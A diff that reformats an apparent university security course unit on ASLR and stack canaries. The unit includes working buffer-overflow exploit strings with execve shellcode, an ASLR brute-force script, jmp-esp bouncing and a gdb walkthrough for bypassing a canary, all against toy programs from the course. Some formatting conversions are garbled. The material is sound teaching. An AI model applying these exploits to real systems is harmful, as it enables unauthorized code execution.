@@ -1,7 +1,6 @@
 # Unit 5: Defensive Techniques
 
-ASLR: Address Space Layout Randomization
-========================================
+# ASLR: Address Space Layout Randomization
 
 So far this semester we've turning off a bunch of security features that
 have made a lot of our exploits a lot easier. This lesson, we are going
@@ -12,7 +11,7 @@ overflow by randomizing the mapping of the memory at processes load
 time. What this means practically is that if you have are performing an
 exploit like so
 
-``` {.example}
+``` example
                                           .-----------.
                                           |           |
                                           |           v
@@ -30,8 +29,7 @@ some situations, we don't actually have to guess anything. We can
 leverage the non-randomized parts of the program to do our dirty work
 for us.
 
-How random is random really?
-============================
+# How random is random really?
 
 The first thing to do is to investigate how ASLR works. To do that, we
 need to first understand a bit how memory is *mapped* for a process.
@@ -42,7 +40,7 @@ look at the maps of a process use the `/proc` file system.
 To do so, we'll consider a small program that just busy waits, which we
 can run in the background, and then we can look at its maps.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./busy_wait &
 [4] 7984
 [3]   Terminated              ./busy_wait
@@ -73,7 +71,7 @@ fault.
 Also, the memory space is not randomized. We can see that is the case if
 we were to run this program again and look at the maps:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ killall busy_wait
 user@si485H-base:demo$ ./busy_wait &
 [5] 7988
@@ -97,7 +95,7 @@ bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
 
 Same mappings. Now, let's turn on address space randomization.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space 
 2
 ```
@@ -105,7 +103,7 @@ user@si485H-base:demo$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 If we were to look at the maps again, this time the picture is a bit
 different:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./busy_wait &
 [2] 7999
 user@si485H-base:demo$ cat /proc/7999/maps
@@ -144,7 +142,7 @@ different values of the stack. Here's a script to do that:
 
 And the output:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./rand_stack.sh 2>/dev/null
 bf8d5000-bf8f6000 rwxp 00000000 00:00 0          [stack]
 bfa39000-bfa5a000 rwxp 00000000 00:00 0          [stack]
@@ -173,8 +171,7 @@ bfd79000-bfd9a000 rwxp 00000000 00:00 0          [stack]
 bfb1e000-bfb3f000 rwxp 00000000 00:00 0          [stack]
 ```
 
-Bits of Entropy
----------------
+## Bits of Entropy
 
 You may notice from above that while there is randomness in the
 placement of the stack, there is not a *huge* amount of randomness. The
@@ -200,7 +197,7 @@ The program just prints the address of a stack defined variable. If we
 were to run this program once or twice we can see that we are getting
 different values each time:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./rand_sample 
 0xbffe6f4c
 user@si485H-base:demo$ ./rand_sample 
@@ -215,7 +212,7 @@ Now, let's take this a bit further. Here's a python program that will
 read in these values and determine which of the bits are actually
 changing across runs:
 
-```python
+``` python
   #!/usr/bin/python
 
   import sys
@@ -254,7 +251,7 @@ changing across runs:
 
 Bringing these program together:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ for i in `seq 1 1 100`; do ./rand_sample ; done | python random_bits.py 
 Consitent:  10111111100000000000000000001100 0xbf80000c
   Changed:  11111111100000000000000000001111 19
@@ -263,26 +260,25 @@ Consitent:  10111111100000000000000000001100 0xbf80000c
 We see that the prefix 0xbf8 and the suffix 0xc persist across runs. In
 total, only 19 of the 32 bits is random. This is a big difference.
 Consider that if there was truly 32 bits of randomness, that means there
-could be 2^32^ possible values to guess, or roughly 4 billion.
+could be 2<sup>32</sup> possible values to guess, or roughly 4 billion.
 
-On the other hand, 2^19^ is a more tractable number. That's only roughly
-half a million, which on face value may seam like a lot, but it is
-significantly smaller than 4 billion. More so, we only have to be right
-once to exploit the program, and the probability that we are right
-increases exponentially with each guess.
+On the other hand, 2<sup>19</sup> is a more tractable number. That's
+only roughly half a million, which on face value may seam like a lot,
+but it is significantly smaller than 4 billion. More so, we only have to
+be right once to exploit the program, and the probability that we are
+right increases exponentially with each guess.
 
-Probability of Success
-----------------------
+## Probability of Success
 
 The next question is, given that there are only 19 bits of randomness to
 play with here, what is our probability of correctly guessing the right
 return address.
 
-With one guess, that would be 2^(-19)^ or 1/524288, which doesn't seem
-that good, but we're talking about computers here, so we guess a lot of
-times. To see how this probability changes in the number of guesses we
-make, we can treat this like an expectation of a geometric probability
-calculation.
+With one guess, that would be 2<sup>(-19)</sup> or 1/524288, which
+doesn't seem that good, but we're talking about computers here, so we
+guess a lot of times. To see how this probability changes in the number
+of guesses we make, we can treat this like an expectation of a geometric
+probability calculation.
 
 The idea is that if we were to make `n` guesses, what is probability
 that we get the right address at least once. At least once calculations
@@ -292,26 +288,26 @@ right, and the inverse of that probability would be the same as getting
 it right *at least* once.
 
 The probability of not guessing correctly is calculated as one minus the
-probability of guessing correctly (or $`q`$):
+probability of guessing correctly (or \$\`q\`\$):
 
-```math
+``` math
 q = 1 - \frac{1}{2^{19}}
 ```
 
-So if we were to consider the probility in $`n`$ attempts of *not* getting
-it right, that would be
+So if we were to consider the probility in \$\`n\`\$ attempts of *not*
+getting it right, that would be
 
-```math
+``` math
 1 - q^{\ n}
 ```
 
-Another way to read this is that after $`n`$ independent events, each with
-a probability of not guessing correctly, the probability of getting at
-least one right, is the inverse of never getting it right.
+Another way to read this is that after \$\`n\`\$ independent events,
+each with a probability of not guessing correctly, the probability of
+getting at least one right, is the inverse of never getting it right.
 
 Here is a small python program that does this calculation for us:
 
-```python
+``` python
 #!/usr/bin/python
 
 import sys
@@ -327,9 +323,9 @@ if __name__ == "__main__":
         print i, prob
 ```
 
-Running it for $2^19$, we can start to see the challenge:
+Running it for 2<sup>19</sup>, we can start to see the challenge:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 10
 0 1.90734863281e-06
 1 3.81469362765e-06
@@ -346,7 +342,7 @@ user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 10
 
 Our odds are pretty bad, but after a few thousands attempts:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 1000 | tail 
 991 0.0018903027712
 992 0.00189220651437
@@ -388,13 +384,12 @@ Things are starting to look a bit better, but not that great.
 Fortunately, we can do a lot better than this with some careful
 nop-sledding.
 
-On ASLR and NOP sleds
----------------------
+## On ASLR and NOP sleds
 
 In the calculations before we were only considering the situation where
 we have to get it exactly right, like in the exploit below:
 
-``` {.example}
+``` example
                                           .-----------.
                                           |           |
                                           |           v
@@ -404,7 +399,7 @@ we have to get it exactly right, like in the exploit below:
 But, we aren't considering the NOP sled, what if we did the following
 with the exploit:
 
-``` {.example}
+``` example
                                           .---------------.
                                           |               |
                                           |               v
@@ -425,7 +420,7 @@ fixed last 4. That leaves *only* 32-16-9 = 7 bits of randomness to
 contend with, and that ain't much, just 128 possibilities! The
 probabilities really start to work in our favor now:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 10 | tail
 1 0.0155639648438
 2 0.0232548713684
@@ -464,8 +459,7 @@ user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 1000 | tail
 After a hundred guesses, we have more than 50% probability of getting it
 right at least once! So let's make that happen.
 
-Brute Forcing ASLR
-==================
+# Brute Forcing ASLR
 
 Now that we see how *easy* it is to guess the right place to jump, let's
 see what it takes to actually brute force this. The first thing we need
@@ -516,7 +510,7 @@ int main(int argc, char *argv[]){
 
 And here is the exploit string we will use:
 
-``` {.example}
+``` example
 ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
 ```
 
@@ -524,7 +518,7 @@ The embedded shell code is our 21 byte *smallest shell code*, and we
 will put in 0xffff nop's to increase our chances. Here's a little shell
 script to perform the brute force:
 
-``` {#brute_force.sh .bash}
+``` bash
   #!/bin/bash
 
   let i=1
@@ -540,7 +534,7 @@ script to perform the brute force:
 The script will print out the number of attempts, and also the address
 of the stack pointer on the last failed attempt. And off it goes ...
 
-``` {.example}
+``` example
 ./brute_force.sh 
 1 sp bfe6fff0
 
@@ -621,14 +615,12 @@ of the stack pointer on the last failed attempt. And off it goes ...
 20 sp bfddb220
 
 $ 
-
 ```
 
 This time it took 20 attempts to get it ... the next time, maybe more,
 maybe less. But the odds are ever in our favor :)
 
-Bouncing to Defeat ASLR
-=======================
+# Bouncing to Defeat ASLR
 
 One thing we learned by brute forcing ASLR is that randomness may not be
 as random as we want it to be. However, things get worse when something
@@ -637,8 +629,7 @@ some other part of the code is not random. If that non-random region
 happened to hold some instruction that would be useful, and it was
 always in that same spot, then we could use it as part of our exploit.
 
-Call/Jmp esp bounce
-===================
+# Call/Jmp esp bounce
 
 What are we looking for exactly? Well there are two instructions that
 are particularly useful: `jmp esp` and `call esp`. These two
@@ -646,7 +637,7 @@ instructions are super useful due to what happens right before the
 return address. Consider the `leave` and `ret` commands, which are
 equivalent to the following:
 
-``` {.example}
+``` example
   leave --> mov esp,ebp
             pop ebp
 
@@ -660,7 +651,7 @@ stack look like when that procedure finishes, and what is esp
 referencing. If we look at situation where we are using an exploit like
 so:
 
-``` {.example}
+``` example
                                           .-----------.
                                           |           |
                                           |           v
@@ -669,14 +660,14 @@ so:
 
 Our stack would like this as we moved through the procedures
 
-``` {.example}
+``` example
                 leave->mov esp,ebp       ret->pop eip
                        pop ebp
 ```
 
 :
 
-``` {.example}
+``` example
                        ebp->|   ???   |  ebp->|   ???   |
       .---------.           |---------|       |---------|
       | s  c    |           | s  c    |       | s  c    |
@@ -694,7 +685,6 @@ ebp-> |   sbp   |
       .         . 
 esp-> |         |
       '---------'
-
 ```
 
 And looky there, `esp` is pointing right at our shell code. So, if knew
@@ -702,12 +692,11 @@ the location of a `jmp esp` or `call esp` instruction, then we can write
 that address as the return address and that would then execute our shell
 code. This is called *bouncing*.
 
-Finding a bounce point
-----------------------
+## Finding a bounce point
 
 To start, we need to what bytes constitute a `jmp esp` or a `call esp`.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel jmpcall_esp
 
 jmpcall_esp:     file format elf32-i386
@@ -775,7 +764,7 @@ relative to the stack and base pointers.
 
 To learn the address of our bounce point, we can look at `objdump`.
 
-``` {.example}
+``` example
 080484ad <jmpesp_embedding>:
  80484ad:   55                      push   ebp
  80484ae:   89 e5                   mov    ebp,esp
@@ -788,7 +777,7 @@ At address 0x08048b0, we have a `jmp esp`, and now to use that as our
 overwrite for the return address. Below, I use the smallest shell code
 (21-byte) code as before:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xb0\x84\x04\x08' + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
 $ cat /proc/sys/kernel/randomize_va_space
 2
@@ -798,8 +787,7 @@ $
 And, on the first try, BAM!, and look, no NOP sled. As you can see, this
 is with address space randomization. This just got easy ... sort of.
 
-Bouncing off Linux Gate (Linux 2.6.X)
--------------------------------------
+## Bouncing off Linux Gate (Linux 2.6.X)
 
 People have known about this vulnerability for awhile, so they try hard
 get rid of bounce points, but that was not always the case. Let's take a
@@ -815,7 +803,7 @@ taking a trip down memory lane ... I've got a Ubuntu 6.06 VM running.
 We can run the same tests to check out the randomness as we did in the
 last lesson:
 
-``` {.example}
+``` example
 user@ubuntu-6-06:~/si485h-class-demos/class/16$ uname -a
 Linux ubuntu-6-06 2.6.15-26-386 #1 PREEMPT Thu Aug 3 02:52:00 UTC 2006 i686 GNU/Linux
 
@@ -828,7 +816,7 @@ And we do see that the yes, in fact there is randomization going on, but
 it is not quite as it seems. Let's look what happens when we look at the
 maps:
 
-``` {.example}
+``` example
 user@ubuntu-6-06:~/si485h-class-demos/class/16$ ./busy_wait &
 [2] 10252
 user@ubuntu-6-06:~/si485h-class-demos/class/16$ cat /proc/10252/maps 
@@ -868,7 +856,7 @@ What is that? Well that is the linux kernel entry points for system
 calls, the so called linux kernel gateway. Using the `ldd` tool, we can
 see this more so:
 
-``` {.example}
+``` example
 user@ubuntu-6-06:~/si485h-class-demos/class/16$ ldd busy_wait
     linux-gate.so.1 =>  (0xffffe000)
     libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e20000)
@@ -878,7 +866,7 @@ user@ubuntu-6-06:~/si485h-class-demos/class/16$ ldd busy_wait
 What's in this non-randomized location? Well, let's see if it at least
 has what we need, and we can search it using a very simple C program:
 
-``` {#search_gate.c .c}
+``` c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -898,7 +886,7 @@ int main(){
 }
 ```
 
-``` {.example}
+``` example
 user@ubuntu-6-06:~/si485h-class-demos/class/17$ ./search_gate 
 Found jmp esp at 0xffffe777
 ```
@@ -907,7 +895,7 @@ So we can now use that address as our bounce point to exploit the
 vulnerable program. Here's that vulnerable program being exploited,
 agian.
 
-``` {.example}
+``` example
 user@ubuntu-6-06:~/si485h-class-demos/class/17$ ./vulnerable 1 `python -c "print 'A'*(0x20+0x8) + '\x77\xe7\xff\xff' + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
 To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
@@ -917,8 +905,7 @@ exit
 user@ubuntu-6-06:~/si485h-class-demos/class/17$
 ```
 
-Basing from dmesg
-=================
+# Basing from dmesg
 
 Another strategy for circumventing ASLR is called basing, where through
 some side channel, you learn the offset or the base address of the
@@ -926,8 +913,7 @@ loaded page, which will reveal where to jump. This can be done remotely,
 or locally, and here we'll focus on using `dmesg` to reveal the base of
 the map and our jump point.
 
-dmesg
------
+## dmesg
 
 `dmesg` is the kernel logging functionality that is availble to the
 user. It reports things like network setup and tear down, and also
@@ -936,7 +922,7 @@ information about segementation faults. Which we will use today.
 For example, let's consider segfaulting (on purpose) our vulnerable
 program:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 1 `python -c "print 'A'*100"`
 Segmentation fault (core dumped)
 user@si485H-base:demo$ dmesg | tail -1
@@ -950,8 +936,7 @@ the instruction pointer has a bunch of A's overwritten it.
 More importantly, we can see that the stack pointer is also revealed,
 and with the base address we need, 0xbf90000!
 
-On fork() and memory space
---------------------------
+## On fork() and memory space
 
 Another item we can leverage is that `fork()`'ed process share the same
 memory space as there parent. For example, here is a sample program:
@@ -976,7 +961,7 @@ memory space as there parent. For example, here is a sample program:
   }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fork_rand_sample 
 Parent: 0xbf9ced9c
 Child: 0xbf9ced9c
@@ -988,8 +973,7 @@ the tasks. If we can get the child to crash, there would be a log
 message in dmesg, but the parent would persist. That's exactly what we
 need to attack the parent process.
 
-Basing a logging engine
------------------------
+## Basing a logging engine
 
 Below is a sample logging utility that uses a socket to accept new
 messages:
@@ -1131,7 +1115,6 @@ messages:
     return 0;
   }
 
-
 ```
 
 The gist of the program is that the server waits for new incoming
@@ -1151,7 +1134,7 @@ Let's consider how to do this, by first starting the server in one
 terminal and probing it in another, when we connect we see the
 following:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ netcat localhost 2525
 Hello 0.5.119.183: Send log message
 loging
@@ -1164,7 +1147,7 @@ Goodbye!
 
 Let's start sending it a bit more stuff ...
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print 'A'*50" | netcat localhost 2525
 Hello 0.5.119.183: Send log message
 [1445621810] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAA
@@ -1174,41 +1157,38 @@ Hello 0.5.119.183: Send log message
 
 That seemed to cause a problem, so lets check the dmesg output:
 
-\#+BEGIN~EXAMPLE~ user@si485H-base:demo\$ dmesg | tail -1
+\#+BEGIN<sub>EXAMPLE</sub> user@si485H-base:demo\$ dmesg | tail -1
 [2877400.157327] logger[23967]: segfault at a0a35 ip 08048af3 sp
 bfe11eb0 error 4 in logger[8048000+1000]
 
-\#+END~EXAMPLE~
+\#+END<sub>EXAMPLE</sub>
 
 There you go, we see that we caused a segfault. Notice the ip is still
 mostly intact, so let's increase the length of our string until we see
 0xdeadbeef for the ip.
 
-\#+BEGIN~EXAMPLE~ user@si485H-base:demo\$ python -c "print 'A'\*50 +
-'\\xef\\xbe\\xad\\xde'" | netcat localhost 2525 Hello 0.5.119.183: Send
-log message
+\#+BEGIN<sub>EXAMPLE</sub> user@si485H-base:demo\$ python -c "print
+'A'\*50 + '\\xef\\xbe\\xad\\xde'" | netcat localhost 2525 Hello
+0.5.119.183: Send log message
 
-Stack Smashing Detected
-=======================
+# Stack Smashing Detected
 
 At some point in your programming life, you may have noticed the
 following error message, either because (like in this class) you are
 trying to smash the stack, or because you made some sort of a
 programming error (more likely).
 
-``` {.example}
+``` example
  user@si485H-base:demo$ ./smasher `python -c "print 'A'*100"`
  You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  *** stack smashing detected ***: ./smasher terminated
  Aborted (core dumped)
-
 ```
 
 What is this that error? How is it generated? How is it tested for? How
 do we defeat such a check? That's what we'll be working on next.
 
-Stack Guards and Canaries
--------------------------
+## Stack Guards and Canaries
 
 A *stack guard* or a *canary* is a bit of data that sits between your
 buffer and the return address and acts as a warning when buffers are
@@ -1221,15 +1201,14 @@ overwritten, the program knows it is time to abort the operation and
 report an error rather than actually returning from the function and
 potentially setting up a vulnerability.
 
-Implementing Stack Guards and Canaries
---------------------------------------
+## Implementing Stack Guards and Canaries
 
 While the canaries are added in through a compilation process with
 gcc---and we will take a look at that in more detail in a bit---we can
 also implement our own version of canary checks to see how this process
 all works. Here's some sample code:
 
-``` {#mycanaries.c .c}
+``` c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -1278,7 +1257,6 @@ int main(int argc, char *argv[]){
   foo(argv[1]);
 
 }
-
 ```
 
 First focus on the `foo` function, where after declaring the static
@@ -1300,7 +1278,7 @@ that spot, and now we can set and check as needed.
 
 Let's see how it works:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*8"`
 You said: AAAAAAAA
 user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*9"`
@@ -1315,8 +1293,7 @@ Aborted (core dumped)
 
 ... like a charm.
 
-The anatomy of a canary
------------------------
+## The anatomy of a canary
 
 Let's take a closer look at the `initcanary` function to understand the
 anatomy of what makes a good canary:
@@ -1355,15 +1332,14 @@ your leveraging `strcpy()`? Well `strcpy()` will stop at the null byte
 and thus you can't easily overwrite the canary, even if you knew it or
 were trying to guess it.
 
-Watching Canaries in Action
----------------------------
+## Watching Canaries in Action
 
 Finally, to put all the pieces together, we need to be able to see the
 cannery in action to understand its function. To do that, I've written a
 nifty little function that will print the stack of a calling process, so
-called print~stack~(), whose source is below:
+called print<sub>stack</sub>(), whose source is below:
 
-``` {#print_stack.h .c}
+``` c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -1436,7 +1412,7 @@ void foo(char * s){
 And now when we run it, we can see what happens. Let's start by
 inspecting for a run where nothing should go wrong:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*9"`
 --- STACK foo ---
 0xbffff680 <ebp+0x8>: bffff878
@@ -1476,7 +1452,7 @@ You said: AAAAAAAAA
 You see that the buffer comes short of killing the canary. Now, let's do
 10 A's:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*10"`
 --- STACK foo ---
 0xbffff680 <ebp+0x8>: bffff877
@@ -1518,7 +1494,7 @@ which will copy the NULL byte to the end. That means that 11 bytes are
 written, the last one being 0x00. Fortunately, because our canary has a
 0x00 in our last byte, we don't abort. However, at 11 we do:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*11"`
 --- STACK foo ---
 0xbffff680 <ebp+0x8>: bffff876
@@ -1560,13 +1536,12 @@ Aborted (core dumped)
 Now the canary is dead, and the world has been saved from one more
 exploit.
 
-GCC's implementation of Stack Canaries
-======================================
+# GCC's implementation of Stack Canaries
 
 So far, we've been compiling our programs such that stack protectors
 have been turned off:
 
-``` {.example}
+``` example
  gcc -fno-stack-protector -z execstack
 ```
 
@@ -1574,7 +1549,7 @@ Now, let's compile a few programs with included stack protectors so we
 can get a better sense of how gcc implements these. (Note, we'll turn
 off the `execstack` option at some point soon).
 
-``` {.example}
+``` example
 user@si485H-base:demo$ cat smasher.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1604,13 +1579,12 @@ You said: AAAAAAAAAAA
 Aborted (core dumped)
 ```
 
-Disassembling Canary Code
--------------------------
+## Disassembling Canary Code
 
 We can start by placing a break point at foo, and looking at the
 disassembly in gdb.:
 
-``` {.example}
+``` example
 (gdb) br foo
 Breakpoint 1 at 0x80484a9: file smasher.c, line 5.
 (gdb) r `python -c "print 'A'*11"`
@@ -1660,7 +1634,7 @@ of 0x14 from the start of the segment. Unfortunately, we can't easily
 inspect this segment in gdb, but we can take a step and see what the
 canary is.
 
-``` {.example}
+``` example
 (gdb) ni
 0x080484af  5   void foo(char * s){
 (gdb) ds
@@ -1704,7 +1678,7 @@ hasn't changed. If so, it will do the abort.
 Lets now continue until right before the call to `strcpy()` and inspect
 the stack:
 
-``` {.example}
+``` example
 (gdb) br *0x080484c1
 Breakpoint 2 at 0x80484c1: file smasher.c, line 7.
 (gdb) c
@@ -1749,7 +1723,7 @@ can also see the canary value 0x3444a500, nd all the way up to the
 return address 0x0804850. Now if we take one more step, this picture
 changes:
 
-``` {.example}
+``` example
 (gdb) ni
 9     printf("You said: %s\n",buf);
 (gdb) ds
@@ -1786,7 +1760,7 @@ End of assembler dump.
 After this, our canary is dead. And with a final continue, we'll never
 reach the leave and return.
 
-``` {.example}
+``` example
 (gdb) c
 Continuing.
 You said: AAAAAAAAAAA
@@ -1796,14 +1770,13 @@ Program received signal SIGABRT, Aborted.
 0xb7fdd424 in __kernel_vsyscall ()
 ```
 
-Canaries Are Consistent across Function Calls and Forks
--------------------------------------------------------
+## Canaries Are Consistent across Function Calls and Forks
 
 Another interesting thing to notice about canaries is that they do not
 change throughout the entire run of a program. We can see this in this
 single sample program:
 
-``` {.example}
+``` example
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -1834,7 +1807,7 @@ int main(){
 This function forks 3 times, once in a child, and calls `foo` with a
 `print_stack`, and the result is:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fork_guards 
 AAAAAAAAAA
 --- STACK foo ---
@@ -1893,8 +1866,7 @@ IF you look closely, you'll see that the canary `0x00c02688` is the same
 in all instances. This might be something we can leverage when defeating
 the canary.
 
-Defeating Stack Canaries
-========================
+# Defeating Stack Canaries
 
 It is actually really hard to defeat a stack canary. It requires a bit
 of luck (guessing the canary) and some really poorly written code. Just
@@ -1904,8 +1876,7 @@ Before we get into all of that, there is *another* way to defeat a
 canary, which is jumping the canary entirely. We don't quite yet know
 how to do that, but we will get there soon.
 
-Some Really Bad Code
---------------------
+## Some Really Bad Code
 
 To not kill the canary, we need vulnerable program that will overrun a
 buffer and also(!) write null bytes along the way. This is so we can
@@ -1947,7 +1918,7 @@ The program reads in command line fields as hex numbers and prints them
 out as strings. It is actually not a useless program, but there is a
 vulnerability. We can overrun the numbers array. Let's see that happen:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./hex_to_char 0x41424344 0x45464748 0x494a4b4c 0x4d4e4f50
 0x0: DCBA
 0x4: HGFE
@@ -1957,7 +1928,7 @@ user@si485H-base:demo$ ./hex_to_char 0x41424344 0x45464748 0x494a4b4c 0x4d4e4f50
 
 If we go a bit extreme stack smash detected!:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./hex_to_char `python -c "print ' '.join(map(hex,range(0x41414141,0x41414150)))"`
 0x0: AAAA
 0x4: BAAA
@@ -1981,7 +1952,7 @@ Aborted (core dumped)
 If we look at the first part of the disassembly of the vulnerable foo
 function in gdb:
 
-``` {.example}
+``` example
   0x080484bd <+0>:  push   ebp
    0x080484be <+1>: mov    ebp,esp
    0x080484c0 <+3>: push   esi
@@ -2015,7 +1986,7 @@ That means we have 0x3c or 40 bytes or 8 integers to get to the canary,
 then it is 0xf or 16 bytes or 4 integers to overwrite the return
 address. Our exploit needs to look something like this:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./hex_to_char `python -c "print '0x646170 '*10 + '0x6e616300 ' + '0x646170 '*4 +'0x72646461 ' + '0x706f6e '*10 + '0x6c656873 '*5"`
 0x0: pad
 0x4: pad
@@ -2056,12 +2027,11 @@ The exploit is we first do some padding, then the canary, then more
 padding, the return address, nops, the shell code. Easy, right? Let's
 see how we can do this in gdb.
 
-Defeating a Canary in GDB
--------------------------
+## Defeating a Canary in GDB
 
 The first thing we need is to set up our shell code:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ echo $(printf `./hexify.sh smallest_shell` | ./le-fourbytes.py - | tr "\n" " ")
 0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080
 ```
@@ -2070,15 +2040,14 @@ Then we need to run under gdb with the right padding and everything, we
 can start gdb, execute with those arguments, and break in foo to learn
 the canary value:
 
-``` {.example}
-
+``` example
 
 ```
 
 Ok, so now that we now our canary value and where to jump, let's restart
 the program with those values:
 
-``` {.example}
+``` example
 (gdb) br foo
 Breakpoint 1 at 0x80484cb: file hex_to_char.c, line 5.
 (gdb) r `python -c "print '0x41414141 '*10 + '0xcafebabe ' + '0x41414141 '*3 +'0xdeadbeef ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
@@ -2110,7 +2079,7 @@ We now know a canary (0x90ba2000) value and we know a location to jump
 to (0xbfff4a\*), so we can restart our program with those values. But
 when we do that, the cannary value has changed:
 
-``` {.example}
+``` example
 (gdb) r `python -c "print '0x41414141 '*10 + '0x90ba2000 ' + '0x41414141 '*3 +'0xbffff4a4 ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -2129,7 +2098,7 @@ And in here lies the problem: Every time we restart the program we loose
 the canary, but we can pretend like we knew it before hand by modifying
 our input in gdb:
 
-``` {.example}
+``` example
 (gdb) x/s *(args+10)
 0xbffff79e: "0x90ba2000"
 (gdb) set *(args+10)="0xaae87500"
@@ -2139,7 +2108,7 @@ our input in gdb:
 
 And if were to now remove the breakpoints and continue:
 
-``` {.example}
+``` example
 (gdb) d
 Delete all breakpoints? (y or n) y
 (gdb) c
@@ -2185,8 +2154,7 @@ good way to do this outside of GDB. We need a program that does a bit
 more, in particular, a program we can crash a bunch to brute force the
 canary
 
-Brute Forcing the Canary
-------------------------
+## Brute Forcing the Canary
 
 Why don't we just try and brute force cannary, how hard could it be?
 Well, let's compare this to ASLR. With ASLR, there was 19 bits of
